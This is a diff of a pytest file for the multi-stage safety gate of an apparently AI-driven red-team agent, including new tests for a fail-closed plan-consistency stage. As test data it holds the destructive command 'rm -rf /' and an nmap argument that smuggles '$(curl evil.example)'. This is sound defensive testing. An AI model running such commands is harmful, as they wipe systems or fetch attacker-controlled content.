@@ -7,18 +7,22 @@ from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
 
-from oubliette_warden.agents.codegen.base import (  # noqa: E402
+from oubliette_warden.agents.codegen.base import (
     AttackTechnique,
     Command,
     ExecutionEnv,
+    Task,
 )
-from oubliette_warden.agents.codegen.safety_gate import (  # noqa: E402
+from oubliette_warden.agents.codegen.safety_gate import (
+    DEFAULT_PIPELINE,
+    GateContext,
     GateDecision,
     Verdict,
     evaluate,
     _stage_llm_judge,
     _stage_rag_guard,
 )
+from oubliette_warden.agents.planner.planner import Edge, TaskGraph
 
 
 def _cmd(
@@ -28,6 +32,7 @@ def _cmd(
     impact: bool = False,
     runtime: int = 60,
     targets: list[str] | None = None,
+    task_id: str = "",
 ) -> Command:
     return Command(
         adapter_name=adapter,
@@ -38,14 +43,27 @@ def _cmd(
         is_active_probe=True,
         expected_runtime_seconds=runtime,
         rationale="test",
+        task_id=task_id,
     )
+
+
+def _eval(cmd: Command, env: ExecutionEnv) -> GateDecision:
+    """Evaluate against the legacy downstream pipeline explicitly.
+
+    CRIT-1 made the *default* pipeline prepend a fail-closed plan_consistency
+    stage. The tests below target the five downstream deterministic stages
+    (pre_filter/pattern_detector/rag_guard/llm_judge/mcp_guard), so they pin the
+    explicit DEFAULT_PIPELINE. The new attribution gate has its own dedicated
+    tests (see the CRIT-1 section at the bottom of this file).
+    """
+    return evaluate(cmd, env, pipeline=DEFAULT_PIPELINE)
 
 
 def test_well_formed_command_still_escalates_pending_llm_judge():
     """CRIT-3: llm_judge is a fail-closed stub (no real integration yet), so
     even a structurally well-formed command must ESCALATE, never silently
     auto-APPROVE, until a real judge is wired in."""
-    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.ESCALATE
     # every deterministic stage before/after llm_judge still APPROVEs; only
     # llm_judge itself is responsible for the ESCALATE.
@@ -58,29 +76,29 @@ def test_well_formed_command_still_escalates_pending_llm_judge():
 
 
 def test_denies_non_caldera_env():
-    decision = evaluate(_cmd(), ExecutionEnv.LIVE)
+    decision = _eval(_cmd(), ExecutionEnv.LIVE)
     assert decision.final == Verdict.DENY
     assert any("CALDERA_ONLY" in s.reason for s in decision.stages)
 
 
 def test_denies_impact_class():
-    decision = evaluate(_cmd(impact=True), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(impact=True), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.DENY
     assert any("Impact" in s.reason for s in decision.stages)
 
 
 def test_denies_empty_argv():
-    decision = evaluate(_cmd(argv=[]), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(argv=[]), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.DENY
 
 
 def test_denies_empty_target_scope():
-    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.DENY
 
 
 def test_denies_dangerous_substring():
-    decision = evaluate(
+    decision = _eval(
         _cmd(argv=["bash", "-c", "rm -rf /"]),
         ExecutionEnv.CALDERA_ONLY,
     )
@@ -89,7 +107,7 @@ def test_denies_dangerous_substring():
 
 
 def test_denies_shell_substitution():
-    decision = evaluate(
+    decision = _eval(
         _cmd(argv=["nmap", "$(curl evil.example)"]),
         ExecutionEnv.CALDERA_ONLY,
     )
@@ -97,18 +115,18 @@ def test_denies_shell_substitution():
 
 
 def test_escalates_unknown_adapter():
-    decision = evaluate(_cmd(adapter="rogue_tool"), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(adapter="rogue_tool"), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.ESCALATE
     assert any(s.stage == "rag_guard" for s in decision.stages)
 
 
 def test_escalates_long_runtime():
-    decision = evaluate(_cmd(runtime=3600), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(runtime=3600), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.ESCALATE
 
 
 def test_short_circuits_on_first_deny():
-    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.DENY
     # pre_filter denies, so we should NOT have reached the later stages
     stages_run = {s.stage for s in decision.stages}
@@ -116,7 +134,7 @@ def test_short_circuits_on_first_deny():
 
 
 def test_decision_records_all_stages_when_approving():
-    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(), ExecutionEnv.CALDERA_ONLY)
     stages_run = [s.stage for s in decision.stages]
     assert stages_run == ["pre_filter", "pattern_detector", "rag_guard", "llm_judge", "mcp_guard"]
     assert isinstance(decision, GateDecision)
@@ -136,7 +154,7 @@ def test_llm_judge_stub_returns_escalate_not_approve():
 
 def test_llm_judge_stub_escalates_even_impact_free_command():
     """A command with no other red flags at all still can't bypass the stub."""
-    decision = evaluate(_cmd(impact=False, runtime=5), ExecutionEnv.CALDERA_ONLY)
+    decision = _eval(_cmd(impact=False, runtime=5), ExecutionEnv.CALDERA_ONLY)
     assert decision.final == Verdict.ESCALATE
     assert any(s.stage == "llm_judge" and s.verdict == Verdict.ESCALATE for s in decision.stages)
 
@@ -153,3 +171,105 @@ def test_rag_guard_known_adapters_still_approve():
     for name in ("nmap", "msf-aux"):
         result = _stage_rag_guard(_cmd(adapter=name), ExecutionEnv.CALDERA_ONLY)
         assert result.verdict == Verdict.APPROVE
+
+
+# ---------- CRIT-1: plan_consistency is wired into the runtime default path ----------
+#
+# The default pipeline (pipeline=None) now runs plan_consistency FIRST and fails
+# closed when the command cannot be attributed to a real, correctly-ordered
+# planned task. These tests exercise that wiring through evaluate()'s default
+# path (no explicit pipeline), which is exactly the path CommandAdapter._gate_or_raise
+# uses in production.
+
+SCOPE = ["10.0.0.1"]
+
+
+def _single_task_plan(*, approved: bool = False) -> TaskGraph:
+    """A one-node plan whose task matches the default _cmd() (nmap/recon/T1595)."""
+    node = Task(
+        task_id="task-a",
+        intent="recon",
+        target_scope=SCOPE,
+        attck_technique_ids=["T1595"],
+        operator_approved=approved,
+        metadata={},  # no phase -> adapter/phase check is skipped
+    )
+    return TaskGraph(intent="t", target_scope=SCOPE, nodes=[node], edges=[])
+
+
+def _two_task_plan() -> TaskGraph:
+    """recon (task-a) must complete before follow-on (task-b)."""
+    a = Task(
+        task_id="task-a",
+        intent="recon",
+        target_scope=SCOPE,
+        attck_technique_ids=["T1595"],
+        metadata={},
+    )
+    b = Task(
+        task_id="task-b",
+        intent="recon 2",
+        target_scope=SCOPE,
+        attck_technique_ids=["T1595"],
+        metadata={},
+    )
+    return TaskGraph(
+        intent="t", target_scope=SCOPE, nodes=[a, b], edges=[Edge(before="task-a", after="task-b")]
+    )
+
+
+def test_valid_context_passes_plan_consistency_through_default_path():
+    """Valid context (in-plan, predecessors complete) -> plan_consistency APPROVEs
+    and the command flows through the default pipeline. The final verdict is
+    ESCALATE only because of the llm_judge fail-closed stub (CRIT-3), never a
+    plan_consistency DENY."""
+    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
+    decision = evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, context=ctx)
+
+    by_stage = {s.stage: s.verdict for s in decision.stages}
+    assert by_stage["plan_consistency"] == Verdict.APPROVE
+    assert decision.stages[0].stage == "plan_consistency"  # runs FIRST
+    assert decision.final != Verdict.DENY
+    assert decision.final == Verdict.ESCALATE  # llm_judge stub, not plan_consistency
+
+
+def test_missing_context_fails_closed_deny():
+    """No plan context on the default path -> DENY, unattributable."""
+    decision = evaluate(_cmd(task_id="task-a"), ExecutionEnv.CALDERA_ONLY, context=None)
+    assert decision.final == Verdict.DENY
+    assert decision.stages[0].stage == "plan_consistency"
+    assert any("unattributable" in s.reason for s in decision.stages)
+
+
+def test_empty_task_id_fails_closed_deny_even_with_context():
+    """Context present but the command carries no task_id -> DENY, unattributable."""
+    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
+    decision = evaluate(_cmd(task_id=""), ExecutionEnv.CALDERA_ONLY, context=ctx)
+    assert decision.final == Verdict.DENY
+    assert any("unattributable" in s.reason for s in decision.stages)
+
+
+def test_off_plan_task_id_denied():
+    """A task_id not present in the plan is unattributable -> DENY."""
+    ctx = GateContext(plan=_single_task_plan(), completed_task_ids=set())
+    decision = evaluate(_cmd(task_id="ghost"), ExecutionEnv.CALDERA_ONLY, context=ctx)
+    assert decision.final == Verdict.DENY
+    assert decision.stages[0].stage == "plan_consistency"
+
+
+def test_missing_predecessor_denied():
+    """Skip-ahead: task-b's predecessor task-a is not completed -> DENY."""
+    ctx = GateContext(plan=_two_task_plan(), completed_task_ids=set())
+    decision = evaluate(_cmd(task_id="task-b"), ExecutionEnv.CALDERA_ONLY, context=ctx)
+    assert decision.final == Verdict.DENY
+    assert decision.stages[0].stage == "plan_consistency"
+
+
+def test_predecessor_complete_passes_plan_consistency():
+    """Same skip-ahead command, but with the predecessor marked complete, passes
+    plan_consistency (final ESCALATE via the llm_judge stub, not a DENY)."""
+    ctx = GateContext(plan=_two_task_plan(), completed_task_ids={"task-a"})
+    decision = evaluate(_cmd(task_id="task-b"), ExecutionEnv.CALDERA_ONLY, context=ctx)
+    by_stage = {s.stage: s.verdict for s in decision.stages}
+    assert by_stage["plan_consistency"] == Verdict.APPROVE
+    assert decision.final != Verdict.DENY
